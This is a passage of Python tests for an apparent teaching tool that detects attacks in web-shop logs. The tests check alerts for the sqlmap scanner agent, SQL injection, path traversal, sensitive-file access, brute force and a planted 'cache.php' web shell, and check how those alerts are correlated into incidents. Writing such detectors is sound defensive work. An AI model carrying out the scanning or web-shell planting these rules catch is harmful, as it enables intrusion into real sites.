    assert len(tools.process(make_event("/", agent="sqlmap/1.8#stable"))) == 1
    assert tools.process(make_event("/a", agent="sqlmap/1.8#stable")) == []          # once per IP
    assert tools.process(make_event("/", agent=BROWSER, ip="192.0.2.2")) == []

    # The whole attack
    parser, events, alerts = run_shop()
    assert parser.error_count == 0 and len(events) == len(shop_attack())
    by_rule = defaultdict(list)
    for a in alerts:
        by_rule[a.rule].append(a)
    assert {"web-attack", "scanner-agent", "forced-browsing", "brute-force"} <= set(by_rule)
    assert all(a.evidence[0].src_ip != LOAD_BALANCER for a in alerts)
    brute = sorted(by_rule["brute-force"], key=lambda a: a.time)
    assert [a.severity for a in brute] == [Severity.HIGH, Severity.CRITICAL]
    assert all(a.evidence[0].src_ip == "198.51.100.99" for a in brute)
    high = {a.summary.split(" from ")[0] for a in by_rule["web-attack"] if a.severity is Severity.HIGH}
    assert high == {"sql-injection", "path-traversal", "sensitive-file"}
    assert not any("192.0.2.1" in a.summary for a in alerts)           # customers raise nothing
    assert not any("O'Brien" in a.summary or "union rep" in a.summary for a in alerts)

    incidents = Correlator().correlate(alerts)
    recon = [i for i in incidents if "ip:203.0.113.66" in i.entities][0]
    assert "web recon then attack" in recon.sequences and recon.severity >= Severity.HIGH
    assert recon.tactics[0] == "Reconnaissance" and "T1190" in recon.techniques
    takeover = [i for i in incidents if "ip:198.51.100.99" in i.entities][0]
    assert takeover.severity is Severity.CRITICAL and incidents[0] is takeover

    # Without trusting the load balancer, everything is blamed on it
    _, _, blind = run_shop(trusted_proxies=())
    wrong = [a for a in blind if a.rule == "brute-force"]
    assert wrong and all(a.evidence[0].src_ip == LOAD_BALANCER for a in wrong)

    # Practice
    _, _, with_shell = run_shop(extra_rules=[WebShellRule()])
    shells = [a for a in with_shell if a.rule == "web-shell"]
    assert len(shells) == 1 and "cache.php" in shells[0].summary
    assert WebShellRule().process(make_event("/uploads/cat.jpg", 200)) == []
    assert WebShellRule().process(make_event("/uploads/x.php", 404)) == []

    print("All tests passed!")


if __name__ == "__main__":
    print("--- 1-3. Parsing, the real client, and decoding ---")
    section_1_to_3()
    print("\n--- 7. An attack on a web shop, detected and correlated ---")
    section_7()
    run_tests()
